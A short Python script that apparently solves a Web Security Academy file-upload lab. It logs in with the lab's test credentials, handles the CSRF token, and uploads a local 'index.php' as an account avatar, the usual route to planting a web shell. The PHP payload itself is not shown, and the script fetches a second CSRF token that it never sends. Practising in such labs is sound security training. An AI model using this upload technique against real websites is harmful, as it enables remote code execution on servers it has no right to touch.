#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a55004204a3cde980d2263500ec0018.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
) 

with open('index.php', 'rb') as file:
    files = {'file': file}
    response = session.get(url + '/my-account/avatar',verify=False,)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    response = session.post(url + '/my-account/avatar', files=files)
    soup = BeautifulSoup(response.text,'html.parser')
    print(soup)

# soup = BeautifulSoup(response.text,'html.parser')
# print(soup)
